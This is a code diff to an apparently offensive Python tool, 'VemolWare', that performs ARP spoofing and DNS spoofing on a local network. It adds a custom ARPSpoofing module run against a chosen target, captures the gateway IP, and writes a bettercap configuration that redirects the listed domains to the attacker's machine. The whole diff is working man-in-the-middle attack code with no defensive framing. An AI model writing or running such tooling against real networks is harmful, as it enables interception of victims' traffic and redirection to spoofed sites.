@@ -3,6 +3,7 @@ import subprocess
 import sys
 import netifaces
 from optparse import OptionParser
+from vemol_ware_2 import ARPSpoofing
 
 
 DOMAIN_TARGET = {
@@ -11,6 +12,7 @@ DOMAIN_TARGET = {
 }
 
 LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
+GATEWAY_IP = netifaces.gateways()['default'][netifaces.AF_INET][0]
 
 
 class VemolWare:
@@ -50,10 +52,10 @@ class VemolWare:
     
     def create_config_file_bettercap(self):
         file = open('config/config_bettercap.txt','w') 
-        file.write(f'set arp.spoof.targets {self.options.target}\n')
-        file.write('net.probe on\n')
-        file.write('set arp.spoof.internal true\n')
-        file.write('arp.spoof on\n')
+        # file.write(f'set arp.spoof.targets {self.options.target}\n')
+        # file.write('net.probe on\n')
+        # file.write('set arp.spoof.internal true\n')
+        # file.write('arp.spoof on\n')
         file.write(f'set dns.spoof.address {LOCAL_IP}\n')
         file.write(f'set dns.spoof.domains {self.option_domain}, www.vemol.com\n')
         file.write('set dns.spoof.all true\n')
@@ -102,6 +104,9 @@ class VemolWare:
 
 if __name__ == "__main__":
     vemol_ware = VemolWare()
+    
+    arp_spoofing = ARPSpoofing()
+    arp_spoofing.main(vemol_ware.options.target)
     vemol_ware.main()
 
 
